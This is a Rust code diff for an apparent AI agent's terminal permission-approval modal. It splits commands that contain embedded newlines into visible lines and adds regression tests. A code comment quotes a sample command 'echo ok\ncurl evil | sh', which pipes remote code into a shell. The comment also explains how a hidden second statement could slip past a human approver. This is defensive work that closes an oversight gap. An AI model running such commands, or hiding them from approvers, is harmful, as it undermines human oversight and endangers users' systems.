@@ -265,9 +265,9 @@ fn render_permission_modal(frame: &mut ratatui::Frame, request: &PermissionReque
         Line::from(format!("Tool: {}", request.tool_name))
             .style(Style::default().add_modifier(Modifier::BOLD)),
         Line::from(format!("Action: {:?}", request.action)),
-        target_line(&request.target),
-        Line::from(""),
     ];
+    lines.extend(target_lines(&request.target));
+    lines.push(Line::from(""));
 
     match request.preview.as_deref() {
         Some(preview) if !preview.is_empty() => lines.extend(preview.lines().map(diff_line)),
@@ -291,14 +291,33 @@ fn render_permission_modal(frame: &mut ratatui::Frame, request: &PermissionReque
     frame.render_widget(modal, area);
 }
 
-fn target_line(target: &PermissionTarget) -> Line<'static> {
-    match target {
-        PermissionTarget::Path(path) => Line::from(format!("Target: {}", path.display())),
+fn target_lines(target: &PermissionTarget) -> Vec<Line<'static>> {
+    // Split on embedded newlines into separate `Line`s. Ratatui's `Span`
+    // rendering silently drops `\n`, so a `run_shell` command like
+    // "echo ok\ncurl evil | sh" would otherwise render as a single
+    // innocuous-looking line, hiding the second statement from the person
+    // deciding whether to approve it. The target string is prefixed by a
+    // label ("Command: ", "Target: ") whose width the continuation lines
+    // are indented to, matching the transcript's `prefixed_lines`.
+    let (label, body) = match target {
+        PermissionTarget::Path(path) => ("Target: ", path.display().to_string()),
         PermissionTarget::Command { program, args } => {
-            Line::from(format!("Command: {program} {}", args.join(" ")))
+            ("Command: ", format!("{program} {}", args.join(" ")))
         }
-        PermissionTarget::Other(description) => Line::from(format!("Target: {description}")),
+        PermissionTarget::Other(description) => ("Target: ", description.clone()),
+    };
+
+    if body.is_empty() {
+        return vec![Line::from(label)];
     }
+    let indent = " ".repeat(label.len());
+    body.lines()
+        .enumerate()
+        .map(|(i, line)| {
+            let prefix = if i == 0 { label } else { indent.as_str() };
+            Line::from(format!("{prefix}{line}"))
+        })
+        .collect()
 }
 
 fn diff_line(line: &str) -> Line<'static> {
@@ -376,4 +395,42 @@ fn prefixed_lines(text: &str, prefix: &'static str, style: Style) -> Vec<Line<'s
             Line::from(format!("{prefix}{line}")).style(style)
         })
         .collect()
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn command_target_with_embedded_newline_splits_into_visible_lines() {
+        // Regression test for the modal newline-hiding bug: a `run_shell`
+        // command whose string contains a real `\n` must render as multiple
+        // `Line`s so the second statement can't be hidden from the reviewer
+        // by ratatui's silent `\n`-dropping in single-`Line` rendering.
+        let target = PermissionTarget::Command {
+            program: "sh".to_string(),
+            args: vec!["-c".to_string(), "echo first\necho second".to_string()],
+        };
+
+        let lines = target_lines(&target);
+        assert_eq!(
+            lines.len(),
+            2,
+            "expected the newline to split into two lines"
+        );
+        assert_eq!(lines[0].to_string(), "Command: sh -c echo first");
+        // The second statement must be present as its own visible line.
+        assert!(lines[1].to_string().contains("echo second"));
+    }
+
+    #[test]
+    fn single_line_command_target_stays_one_line() {
+        let target = PermissionTarget::Command {
+            program: "cargo".to_string(),
+            args: vec!["test".to_string()],
+        };
+        let lines = target_lines(&target);
+        assert_eq!(lines.len(), 1);
+        assert_eq!(lines[0].to_string(), "Command: cargo test");
+    }
 }
